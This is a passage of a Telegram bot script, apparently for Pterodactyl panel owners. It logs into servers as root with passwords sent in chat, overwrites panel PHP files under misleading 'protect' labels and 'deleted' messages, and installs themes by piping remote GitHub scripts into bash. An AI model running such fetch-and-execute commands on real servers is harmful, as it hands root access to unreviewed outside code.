use Pterodactyl\\Http\\Requests\\Admin\\Api\\StoreApplicationApiKeyRequest;  
  
class ApiController extends Controller  
{  
    /**  
     * ApiController constructor.  
     */  
    public function __construct(  
        private AlertsMessageBag $alert,  
        private ApiKeyRepositoryInterface $repository,  
        private KeyCreationService $keyCreationService,  
        private ViewFactory $view,  
    ) {  
    }  
  
    /**  
     * Render view showing all of a user's application API keys.  
     */  
    public function index(Request $request): View  
    {  
        return $this->view->make('admin.api.index', [  
            'keys' => $this->repository->getApplicationKeys($request->user()),  
        ]);  
    }  
  
    /**  
     * Render view allowing an admin to create a new application API key.  
     *  
     * @throws \\ReflectionException  
     */  
    public function create(): View  
    {  
        $resources = AdminAcl::getResourceList();  
        sort($resources);  
  
        return $this->view->make('admin.api.new', [  
            'resources' => $resources,  
            'permissions' => [  
                'r' => AdminAcl::READ,  
                'rw' => AdminAcl::READ | AdminAcl::WRITE,  
                'n' => AdminAcl::NONE,  
            ],  
        ]);  
    }  
  
    /**  
     * Store the new key and redirect the user back to the application key listing.  
     *  
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException  
     */  
    public function store(StoreApplicationApiKeyRequest $request): RedirectResponse  
    {  
        $this->keyCreationService->setKeyType(ApiKey::TYPE_APPLICATION)->handle([  
            'memo' => $request->input('memo'),  
            'user_id' => $request->user()->id,  
        ], $request->getKeyPermissions());  
  
        $this->alert->success('A new application API key has been generated for your account.')->flash();  
  
        return redirect()->route('admin.api.index');  
    }  
  
    /**  
     * Delete an application API key from the database.  
     */  
    public function delete(Request $request, string $identifier): Response  
    {  
        $this->repository->deleteApplicationKey($request->user(), $identifier);  
  
        return response('', 204);  
    }  
}`
      },
      {
        name: "PROTECT10 (ANTI CREATE CAPIKEY)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Api/Client/ApiKeyController.php",
        file: "ApiKeyController.php",
        code: `<?php    
    
namespace Pterodactyl\\Http\\Controllers\\Api\\Client;    
    
use Pterodactyl\\Models\\ApiKey;    
use Illuminate\\Http\\JsonResponse;    
use Pterodactyl\\Facades\\Activity;    
use Pterodactyl\\Exceptions\\DisplayException;    
use Pterodactyl\\Http\\Requests\\Api\\Client\\ClientApiRequest;    
use Pterodactyl\\Transformers\\Api\\Client\\ApiKeyTransformer;    
use Pterodactyl\\Http\\Requests\\Api\\Client\\Account\\StoreApiKeyRequest;    
    
class ApiKeyController extends ClientApiController    
{    
    /**    
     * Returns all the API keys that exist for the given client.    
     */    
    public function index(ClientApiRequest $request): array    
    {    
        return $this->fractal->collection($request->user()->apiKeys)    
            ->transformWith($this->getTransformer(ApiKeyTransformer::class))    
            ->toArray();    
    }    
    
    /**    
     * Store a new API key for a user's account.    
     *    
     * @throws \\Pterodactyl\\Exceptions\\DisplayException    
     */    
    public function store(StoreApiKeyRequest $request): array    
    {    
        if ($request->user()->apiKeys->count() >= 25) {    
            throw new DisplayException('You have reached the account limit for number of API keys.');    
        }    
    
        $token = $request->user()->createToken(    
            $request->input('description'),    
            $request->input('allowed_ips')    
        );    
    
        Activity::event('user:api-key.create')    
            ->subject($token->accessToken)    
            ->property('identifier', $token->accessToken->identifier)    
            ->log();    
    
        return $this->fractal->item($token->accessToken)    
            ->transformWith($this->getTransformer(ApiKeyTransformer::class))    
            ->addMeta(['secret_token' => $token->plainTextToken])    
            ->toArray();    
    }    
    
    /**    
     * Deletes a given API key.    
     */    
    public function delete(ClientApiRequest $request, string $identifier): JsonResponse    
    {    
        /** @var \\Pterodactyl\\Models\\ApiKey $key */    
        $key = $request->user()->apiKeys()    
            ->where('key_type', ApiKey::TYPE_ACCOUNT)    
            ->where('identifier', $identifier)    
            ->firstOrFail();    
    
        Activity::event('user:api-key.delete')    
            ->property('identifier', $key->identifier)    
            ->log();    
    
        $key->delete();    
    
        return new JsonResponse([], JsonResponse::HTTP_NO_CONTENT);    
    }    
}`
      },
      {
        name: "PROTECT11 (ANTI INTIP DATABASE)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/DatabaseController.php",
        file: "DatabaseController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Exception;
use Illuminate\\View\\View;
use Pterodactyl\\Models\\DatabaseHost;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Services\\Databases\\Hosts\\HostUpdateService;
use Pterodactyl\\Http\\Requests\\Admin\\DatabaseHostFormRequest;
use Pterodactyl\\Services\\Databases\\Hosts\\HostCreationService;
use Pterodactyl\\Services\\Databases\\Hosts\\HostDeletionService;
use Pterodactyl\\Contracts\\Repository\\DatabaseRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\LocationRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\DatabaseHostRepositoryInterface;

class DatabaseController extends Controller
{
    /**
     * DatabaseController constructor.
     */
    public function __construct(
        private AlertsMessageBag $alert,
        private DatabaseHostRepositoryInterface $repository,
        private DatabaseRepositoryInterface $databaseRepository,
        private HostCreationService $creationService,
        private HostDeletionService $deletionService,
        private HostUpdateService $updateService,
        private LocationRepositoryInterface $locationRepository,
        private ViewFactory $view
    ) {
    }

    /**
     * Display database host index.
     */
    public function index(): View
    {
        return $this->view->make('admin.databases.index', [
            'locations' => $this->locationRepository->getAllWithNodes(),
            'hosts' => $this->repository->getWithViewDetails(),
        ]);
    }

    /**
     * Display database host to user.
     *
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function view(int $host): View
    {
        return $this->view->make('admin.databases.view', [
            'locations' => $this->locationRepository->getAllWithNodes(),
            'host' => $this->repository->find($host),
            'databases' => $this->databaseRepository->getDatabasesForHost($host),
        ]);
    }

    /**
     * Handle request to create a new database host.
     *
     * @throws \\Throwable
     */
    public function create(DatabaseHostFormRequest $request): RedirectResponse
    {
        try {
            $host = $this->creationService->handle($request->normalize());
        } catch (\\Exception $exception) {
            if ($exception instanceof \\PDOException || $exception->getPrevious() instanceof \\PDOException) {
                $this->alert->danger(
                    sprintf('There was an error while trying to connect to the host or while executing a query: "%s"', $exception->getMessage())
                )->flash();

                return redirect()->route('admin.databases')->withInput($request->validated());
            } else {
                throw $exception;
            }
        }

        $this->alert->success('Successfully created a new database host on the system.')->flash();

        return redirect()->route('admin.databases.view', $host->id);
    }

    /**
     * Handle updating database host.
     *
     * @throws \\Throwable
     */
    public function update(DatabaseHostFormRequest $request, DatabaseHost $host): RedirectResponse
    {
        $redirect = redirect()->route('admin.databases.view', $host->id);

        try {
            $this->updateService->handle($host->id, $request->normalize());
            $this->alert->success('Database host was updated successfully.')->flash();
        } catch (\\Exception $exception) {
            // Catch any SQL related exceptions and display them back to the user, otherwise just
            // throw the exception like normal and move on with it.
            if ($exception instanceof \\PDOException || $exception->getPrevious() instanceof \\PDOException) {
                $this->alert->danger(
                    sprintf('There was an error while trying to connect to the host or while executing a query: "%s"', $exception->getMessage())
                )->flash();

                return $redirect->withInput($request->normalize());
            } else {
                throw $exception;
            }
        }

        return $redirect;
    }

    /**
     * Handle request to delete a database host.
     *
     * @throws \\Pterodactyl\\Exceptions\\Service\\HasActiveServersException
     */
    public function delete(int $host): RedirectResponse
    {
        $this->deletionService->handle($host);
        $this->alert->success('The requested database host has been deleted from the system.')->flash();

        return redirect()->route('admin.databases');
    }
}`
      },
      {
        name: "PROTECT12 (ANTI INTIP MOUNTS)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/MountController.php",
        file: "MountController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Ramsey\\Uuid\\Uuid;
use Illuminate\\View\\View;
use Illuminate\\Http\\Request;
use Pterodactyl\\Models\\Nest;
use Illuminate\\Http\\Response;
use Pterodactyl\\Models\\Mount;
use Pterodactyl\\Models\\Location;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Illuminate\\View\\Factory as ViewFactory;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Http\\Requests\\Admin\\MountFormRequest;
use Pterodactyl\\Repositories\\Eloquent\\MountRepository;
use Pterodactyl\\Contracts\\Repository\\NestRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\LocationRepositoryInterface;

class MountController extends Controller
{
    /**
     * MountController constructor.
     */
    public function __construct(
        protected AlertsMessageBag $alert,
        protected NestRepositoryInterface $nestRepository,
        protected LocationRepositoryInterface $locationRepository,
        protected MountRepository $repository,
        protected ViewFactory $view
    ) {
    }

    /**
     * Return the mount overview page.
     */
    public function index(): View
    {
        return $this->view->make('admin.mounts.index', [
            'mounts' => $this->repository->getAllWithDetails(),
        ]);
    }

    /**
     * Return the mount view page.
     *
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function view(string $id): View
    {
        $nests = Nest::query()->with('eggs')->get();
        $locations = Location::query()->with('nodes')->get();

        return $this->view->make('admin.mounts.view', [
            'mount' => $this->repository->getWithRelations($id),
            'nests' => $nests,
            'locations' => $locations,
        ]);
    }

    /**
     * Handle request to create new mount.
     *
     * @throws \\Throwable
     */
    public function create(MountFormRequest $request): RedirectResponse
    {
        $model = (new Mount())->fill($request->validated());
        $model->forceFill(['uuid' => Uuid::uuid4()->toString()]);

        $model->saveOrFail();
        $mount = $model->fresh();

        $this->alert->success('Mount was created successfully.')->flash();

        return redirect()->route('admin.mounts.view', $mount->id);
    }

    /**
     * Handle request to update or delete location.
     *
     * @throws \\Throwable
     */
    public function update(MountFormRequest $request, Mount $mount): RedirectResponse
    {
        if ($request->input('action') === 'delete') {
            return $this->delete($mount);
        }

        $mount->forceFill($request->validated())->save();

        $this->alert->success('Mount was updated successfully.')->flash();

        return redirect()->route('admin.mounts.view', $mount->id);
    }

    /**
     * Delete a location from the system.
     *
     * @throws \\Exception
     */
    public function delete(Mount $mount): RedirectResponse
    {
        $mount->delete();

        return redirect()->route('admin.mounts');
    }

    /**
     * Adds eggs to the mount's many-to-many relation.
     */
    public function addEggs(Request $request, Mount $mount): RedirectResponse
    {
        $validatedData = $request->validate([
            'eggs' => 'required|exists:eggs,id',
        ]);

        $eggs = $validatedData['eggs'] ?? [];
        if (count($eggs) > 0) {
            $mount->eggs()->attach($eggs);
        }

        $this->alert->success('Mount was updated successfully.')->flash();

        return redirect()->route('admin.mounts.view', $mount->id);
    }

    /**
     * Adds nodes to the mount's many-to-many relation.
     */
    public function addNodes(Request $request, Mount $mount): RedirectResponse
    {
        $data = $request->validate(['nodes' => 'required|exists:nodes,id']);

        $nodes = $data['nodes'] ?? [];
        if (count($nodes) > 0) {
            $mount->nodes()->attach($nodes);
        }

        $this->alert->success('Mount was updated successfully.')->flash();

        return redirect()->route('admin.mounts.view', $mount->id);
    }

    /**
     * Deletes an egg from the mount's many-to-many relation.
     */
    public function deleteEgg(Mount $mount, int $egg_id): Response
    {
        $mount->eggs()->detach($egg_id);

        return response('', 204);
    }

    /**
     * Deletes a node from the mount's many-to-many relation.
     */
    public function deleteNode(Mount $mount, int $node_id): Response
    {
        $mount->nodes()->detach($node_id);

        return response('', 204);
    }
}`
      },
      {
        name: "PROTECT13 (ANTI BUTTON TWO FACTOR)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Api/Client/TwoFactorController.php",
        file: "TwoFactorController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Api\\Client;

use Carbon\\Carbon;
use Illuminate\\Http\\Request;
use Illuminate\\Http\\Response;
use Illuminate\\Http\\JsonResponse;
use Pterodactyl\\Facades\\Activity;
use Pterodactyl\\Services\\Users\\TwoFactorSetupService;
use Pterodactyl\\Services\\Users\\ToggleTwoFactorService;
use Illuminate\\Contracts\\Validation\\Factory as ValidationFactory;
use Symfony\\Component\\HttpKernel\\Exception\\BadRequestHttpException;

class TwoFactorController extends ClientApiController
{
    /**
     * TwoFactorController constructor.
     */
    public function __construct(
        private ToggleTwoFactorService $toggleTwoFactorService,
        private TwoFactorSetupService $setupService,
        private ValidationFactory $validation
    ) {
        parent::__construct();
    }

    /**
     * Returns two-factor token credentials that allow a user to configure
     * it on their account. If two-factor is already enabled this endpoint
     * will return a 400 error.
     *
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function index(Request $request): JsonResponse
    {
        if ($request->user()->use_totp) {
            throw new BadRequestHttpException('Two-factor authentication is already enabled on this account.');
        }

        return new JsonResponse([
            'data' => $this->setupService->handle($request->user()),
        ]);
    }

    /**
     * Updates a user's account to have two-factor enabled.
     *
     * @throws \\Throwable
     * @throws \\Illuminate\\Validation\\ValidationException
     */
    public function store(Request $request): JsonResponse
    {
        $validator = $this->validation->make($request->all(), [
            'code' => ['required', 'string', 'size:6'],
            'password' => ['required', 'string'],
        ]);

        $data = $validator->validate();
        if (!password_verify($data['password'], $request->user()->password)) {
            throw new BadRequestHttpException('The password provided was not valid.');
        }

        $tokens = $this->toggleTwoFactorService->handle($request->user(), $data['code'], true);

        Activity::event('user:two-factor.create')->log();

        return new JsonResponse([
            'object' => 'recovery_tokens',
            'attributes' => [
                'tokens' => $tokens,
            ],
        ]);
    }

    /**
     * Disables two-factor authentication on an account if the password provided
     * is valid.
     *
     * @throws \\Throwable
     */
    public function delete(Request $request): JsonResponse
    {
        if (!password_verify($request->input('password') ?? '', $request->user()->password)) {
            throw new BadRequestHttpException('The password provided was not valid.');
        }

        /** @var \\Pterodactyl\\Models\\User $user */
        $user = $request->user();

        $user->update([
            'totp_authenticated_at' => Carbon::now(),
            'use_totp' => false,
        ]);

        Activity::event('user:two-factor.delete')->log();

        return new JsonResponse([], Response::HTTP_NO_CONTENT);
    }
}`
      },                                   
      {
        name: "PROTECT14 (𝗠𝗘𝗡𝗚𝗛𝗜𝗟𝗔𝗡𝗚𝗞𝗔𝗡 𝗕𝗔𝗥 𝗠𝗘𝗡𝗨 “𝗡𝗢𝗗𝗘𝗦, 𝗟𝗢𝗖𝗔𝗧𝗜𝗢𝗡𝗦, 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘, 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦, 𝗔𝗣𝗣𝗟𝗜𝗖𝗔𝗧𝗜𝗢𝗡 𝗔𝗣𝗜, 𝗠𝗢𝗨𝗡𝗧𝗦, 𝗡𝗘𝗦𝗧)",
        path: "/var/www/pterodactyl/resources/views/layouts/admin.blade.php",
        file: "admin.blade.php",
        code: `<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>{{ config('app.name', 'Pterodactyl') }} - @yield('title')</title>
        <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
        <meta name="_token" content="{{ csrf_token() }}">

        <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
        <link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
        <link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
        <link rel="manifest" href="/favicons/manifest.json">
        <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#bc6e3c">
        <link rel="shortcut icon" href="/favicons/favicon.ico">
        <meta name="msapplication-config" content="/favicons/browserconfig.xml">
        <meta name="theme-color" content="#0e4688">

        @include('layouts.scripts')

        @section('scripts')
            {!! Theme::css('vendor/select2/select2.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/bootstrap/bootstrap.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/adminlte/admin.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/adminlte/colors/skin-blue.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/sweetalert/sweetalert.min.css?t={cache-version}') !!}
            {!! Theme::css('vendor/animate/animate.min.css?t={cache-version}') !!}
            {!! Theme::css('css/pterodactyl.css?t={cache-version}') !!}
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">

            <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
            <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
            <![endif]-->
        @show
    </head>
    <body class="hold-transition skin-blue fixed sidebar-mini">
        <div class="wrapper">
            <header class="main-header">
                <a href="{{ route('index') }}" class="logo">
                    <span>{{ config('app.name', 'Pterodactyl') }}</span>
                </a>
                <nav class="navbar navbar-static-top">
                    <a href="#" class="sidebar-toggle" data-toggle="push-menu" role="button">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </a>
                    <div class="navbar-custom-menu">
                        <ul class="nav navbar-nav">
                            <li class="user-menu">
                                <a href="{{ route('account') }}">
                                    <img src="https://www.gravatar.com/avatar/{{ md5(strtolower(Auth::user()->email)) }}?s=160" class="user-image" alt="User Image">
                                    <span class="hidden-xs">{{ Auth::user()->name_first }} {{ Auth::user()->name_last }}</span>
                                </a>
                            </li>
                            <li>
                                <li><a href="{{ route('index') }}" data-toggle="tooltip" data-placement="bottom" title="Exit Admin Control"><i class="fa fa-server"></i></a></li>
                            </li>
                            <li>
                                <li><a href="{{ route('auth.logout') }}" id="logoutButton" data-toggle="tooltip" data-placement="bottom" title="Logout"><i class="fa fa-sign-out"></i></a></li>
                            </li>
                        </ul>
                    </div>
                </nav>
            </header>
            <aside class="main-sidebar">
                <section class="sidebar">
                    <ul class="sidebar-menu">
                        <li class="header">BASIC ADMINISTRATION</li>
                        <li class="{{ Route::currentRouteName() !== 'admin.index' ?: 'active' }}">
                            <a href="{{ route('admin.index') }}">
                                <i class="fa fa-home"></i> <span>Overview</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.settings') ?: 'active' }}">
                            <a href="{{ route('admin.settings')}}">
                                <i class="fa fa-wrench"></i> <span>Settings</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.api') ?: 'active' }}">
                            <a href="{{ route('admin.api.index')}}">
                                <i class="fa fa-gamepad"></i> <span>Application API</span>
                            </a>
                        </li>
                        <li class="header">MANAGEMENT</li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.databases') ?: 'active' }}">
                            <a href="{{ route('admin.databases') }}">
                                <i class="fa fa-database"></i> <span>Databases</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.locations') ?: 'active' }}">
                            <a href="{{ route('admin.locations') }}">
                                <i class="fa fa-globe"></i> <span>Locations</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.nodes') ?: 'active' }}">
                            <a href="{{ route('admin.nodes') }}">
                                <i class="fa fa-sitemap"></i> <span>Nodes</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.servers') ?: 'active' }}">
                            <a href="{{ route('admin.servers') }}">
                                <i class="fa fa-server"></i> <span>Servers</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.users') ?: 'active' }}">
                            <a href="{{ route('admin.users') }}">
                                <i class="fa fa-users"></i> <span>Users</span>
                            </a>
                        </li>
                        <li class="header">SERVICE MANAGEMENT</li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.mounts') ?: 'active' }}">
                            <a href="{{ route('admin.mounts') }}">
                                <i class="fa fa-magic"></i> <span>Mounts</span>
                            </a>
                        </li>
                        <li class="{{ ! starts_with(Route::currentRouteName(), 'admin.nests') ?: 'active' }}">
                            <a href="{{ route('admin.nests') }}">
                                <i class="fa fa-th-large"></i> <span>Nests</span>
                            </a>
                        </li>
                    </ul>
                </section>
            </aside>
            <div class="content-wrapper">
                <section class="content-header">
                    @yield('content-header')
                </section>
                <section class="content">
                    <div class="row">
                        <div class="col-xs-12">
                            @if (count($errors) > 0)
                                <div class="alert alert-danger">
                                    There was an error validating the data provided.<br><br>
                                    <ul>
                                        @foreach ($errors->all() as $error)
                                            <li>{{ $error }}</li>
                                        @endforeach
                                    </ul>
                                </div>
                            @endif
                            @foreach (Alert::getMessages() as $type => $messages)
                                @foreach ($messages as $message)
                                    <div class="alert alert-{{ $type }} alert-dismissable" role="alert">
                                        {!! $message !!}
                                    </div>
                                @endforeach
                            @endforeach
                        </div>
                    </div>
                    @yield('content')
                </section>
            </div>
            <footer class="main-footer">
                <div class="pull-right small text-gray" style="margin-right:10px;margin-top:-7px;">
                    <strong><i class="fa fa-fw {{ $appIsGit ? 'fa-git-square' : 'fa-code-fork' }}"></i></strong> {{ $appVersion }}<br />
                    <strong><i class="fa fa-fw fa-clock-o"></i></strong> {{ round(microtime(true) - LARAVEL_START, 3) }}s
                </div>
                Copyright &copy; 2015 - {{ date('Y') }} <a href="https://pterodactyl.io/">Pterodactyl Software</a>.
            </footer>
        </div>
        @section('footer-scripts')
            <script src="/js/keyboard.polyfill.js" type="application/javascript"></script>
            <script>keyboardeventKeyPolyfill.polyfill();</script>

            {!! Theme::js('vendor/jquery/jquery.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/sweetalert/sweetalert.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/bootstrap/bootstrap.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/slimscroll/jquery.slimscroll.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/adminlte/app.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/bootstrap-notify/bootstrap-notify.min.js?t={cache-version}') !!}
            {!! Theme::js('vendor/select2/select2.full.min.js?t={cache-version}') !!}
            {!! Theme::js('js/admin/functions.js?t={cache-version}') !!}
            <script src="/js/autocomplete.js" type="application/javascript"></script>

            @if(Auth::user()->root_admin)
                <script>
                    $('#logoutButton').on('click', function (event) {
                        event.preventDefault();

                        var that = this;
                        swal({
                            title: 'Do you want to log out?',
                            type: 'warning',
                            showCancelButton: true,
                            confirmButtonColor: '#d9534f',
                            cancelButtonColor: '#d33',
                            confirmButtonText: 'Log out'
                        }, function () {
                             $.ajax({
                                type: 'POST',
                                url: '{{ route('auth.logout') }}',
                                data: {
                                    _token: '{{ csrf_token() }}'
                                },complete: function () {
                                    window.location.href = '{{route('auth.login')}}';
                                }
                        });
                    });
                });
                </script>
            @endif

            <script>
                $(function () {
                    $('[data-toggle="tooltip"]').tooltip();
                })
            </script>
        @show
    </body>
</html>`
      },
    ];

    // ========================= UPLOAD SEMUA PROTEKSI =========================
    let successCount = 0;

    for (const file of protectFiles) {
      try {
        const tempFile = path.join(__dirname, file.file);
        fs.writeFileSync(tempFile, file.code);
        await ssh.putFile(tempFile, file.path);
        fs.unlinkSync(tempFile);
        successCount++;
        await bot.sendMessage(
      chatId,
      `🗑️ *${file.name}* berhasil dihapus!\n📂 \`${file.path}\``,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    await bot.sendMessage(
      chatId,
      `❌ Gagal menghapus *${file.name}*\nError: \`${err.message}\``,
          { parse_mode: "Markdown" }
        );
      }
    }

    ssh.dispose();

await bot.sendMessage(
      chatId,
      `🧩 *INSTALASI PROTECT ALL SELESAI!*\n\n` +
      `✅ Berhasil: ${successCount}/${protectFiles.length} file\n` +
      `⚙️ Semua fitur keamanan aktif untuk panelmu.\n\n` +
      `©Protect By @Pirzyy1`,
      { parse_mode: "Markdown" }
    );
    console.log(`🟢 InstallProtectAll selesai untuk user ${userId} di VPS ${host}`);
    ssh.dispose();
  } catch (err) {
    console.error("❌ ERROR INSTALLPROTECTALL:", err);
    await bot.sendMessage(
      chatId,
      `❌ *Gagal menjalankan instalasi ProtectAll.*\n\n` +
      `Error:\n\`${err.message}\``,
      { parse_mode: "Markdown" }
    );
  }
});
 
//=======install thema========//
bot.onText(/^\/installnook(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const senderId = msg.from.id;
  const input = (match[1] || "").trim();

  // 🔐 OWNER ONLY
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan admin.");
  }

  // ❌ TANPA INPUT → FORMAT SALAH
  if (!input) {
    return bot.sendMessage(
      chatId,
      "⚠️ Format salah!\nGunakan:\n`/installnook ip|password`",
      { parse_mode: "Markdown" }
    );
  }

  // ❌ FORMAT SALAH
  if (!input.includes("|")) {
    return bot.sendMessage(
      chatId,
      "⚠️ Format salah!\nGunakan:\n`/installnook ip|password`",
      { parse_mode: "Markdown" }
    );
  }

  let [ipvpsRaw, passwd] = input.split("|").map(v => v.trim());
  if (!ipvpsRaw || !passwd) {
    return bot.sendMessage(chatId, "⚠️ IP atau Password tidak boleh kosong!");
  }

  // 🌐 PORT
  let ipvps = ipvpsRaw;
  let port = 22;
  if (ipvps.includes(":")) {
    const [host, p] = ipvps.split(":");
    ipvps = host;
    port = parseInt(p) || 22;
  }

  const { Client } = require("ssh2");
  const ssh = new Client();
  const conn = { host: ipvps, port, username: "root", password: passwd };
  const command = `bash <(curl -s https://raw.githubusercontent.com/Kelaoffc/Ndyoffc/refs/heads/main/installndyoffc.sh)`;

  await bot.sendMessage(
    chatId,
    `🌀 *Proses Install Tema Nook*
📡 IP: \`${ipvps}:${port}\`
⏳ Tunggu 1–10 menit...`,
    { parse_mode: "Markdown" }
  );

  ssh.on("ready", () => {
    ssh.exec(command, (err, stream) => {
      if (err) {
        ssh.end();
        return bot.sendMessage(chatId, "❌ Gagal menjalankan perintah SSH.");
      }

      stream.on("data", () => {
        stream.write("metrickpack2\n");
        stream.write("21\n");
        stream.write("yes\n");
        stream.write("y\n");
        stream.write("yes\n");
        stream.write("23\n");
      });

      stream.on("close", () => {
        bot.sendMessage(chatId, "✅ *Tema NOOK berhasil diinstall!*", { parse_mode: "Markdown" });
        ssh.end();
      });
    });
  });

  ssh.on("error", () => bot.sendMessage(chatId, "❌ SSH gagal — cek IP atau Password!"));
  ssh.connect(conn);
});

bot.onText(/^\/installnebula(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const senderId = msg.from.id;
  const input = (match[1] || "").trim();

  // 🔐 OWNER ONLY
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan admin.");
  }

  // ❌ TANPA INPUT → FORMAT SALAH
  if (!input) {
    return bot.sendMessage(
      chatId,
      "⚠️ Format salah!\nGunakan:\n`/installnebula ip|password`",
      { parse_mode: "Markdown" }
    );
  }

  // ❌ FORMAT SALAH
  if (!input.includes("|")) {
    return bot.sendMessage(
      chatId,
      "⚠️ Format salah!\nGunakan:\n`/installnebula ip|password`",
      { parse_mode: "Markdown" }
    );
  }

  let [ipvpsRaw, passwd] = input.split("|").map(v => v.trim());
  if (!ipvpsRaw || !passwd) {
    return bot.sendMessage(chatId, "⚠️ IP atau Password tidak boleh kosong!");
  }

  // 🌐 PORT
  let ipvps = ipvpsRaw;
  let port = 22;
  if (ipvps.includes(":")) {
    const [host, p] = ipvps.split(":");
    ipvps = host;
    port = parseInt(p) || 22;
  }

  const { Client } = require("ssh2");
  const ssh = new Client();
  const conn = { host: ipvps, port, username: "root", password: passwd };
  const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;

  await bot.sendMessage(
    chatId,
    `🌀 *Proses Install Tema Nook*
📡 IP: \`${ipvps}:${port}\`
⏳ Tunggu 1–10 menit...`,
    { parse_mode: "Markdown" }
  );

  ssh.on("ready", () => {
    ssh.exec(command, (err, stream) => {
      if (err) {
        ssh.end();
        return bot.sendMessage(chatId, "❌ Gagal menjalankan perintah SSH.");
      }

      stream.on("data", () => {
        stream.write("10\n");
        stream.write("\n");
        stream.write("\n");
        stream.write("x\n");
      });

      stream.on("close", () => {
        bot.sendMessage(chatId, "✅ *Tema NEBULA berhasil diinstall!*", { parse_mode: "Markdown" });
        ssh.end();
      });
    });
  });

  ssh.on("error", () => bot.sendMessage(chatId, "❌ SSH gagal — cek IP atau Password!"));
  ssh.connect(conn);
});

/* ===============================
   STEP 1: COMMAND
================================ */
bot.onText(/^\/installwallpaper(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const senderId = msg.from.id;
  const input = (match[1] || "").trim();

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Akses di tolak, kamu bukan admin.");
  }

  if (!input) {
    return bot.sendMessage(
      chatId,
      "⚠️ Format salah!\nGunakan:\n`/installwallpaper ip|password|linkWallpaper`",
      { parse_mode: "Markdown" }
    );
  }

  const parts = input.split("|").map(v => v.trim());
  if (parts.length < 2) {
    return bot.sendMessage(
      chatId,
      "⚠️ Format salah!\nGunakan:\n`/installwallpaper ip|password|linkWallpaper`",
      { parse_mode: "Markdown" }
    );
  }

  let ipvpsRaw = parts[0];
  const passwd = parts[1];
  const wallpaper = parts[2] || "https://files.catbox.moe/xdsoj7.jpg";

  let ipvps = ipvpsRaw;
  let port = 22;
  if (ipvps.includes(":")) {
    const [host, p] = ipvps.split(":");
    ipvps = host;
    port = parseInt(p) || 22;
  }

  const { Client } = require("ssh2");
  const ssh = new Client();
  const conn = { host: ipvps, port, username: "root", password: passwd };
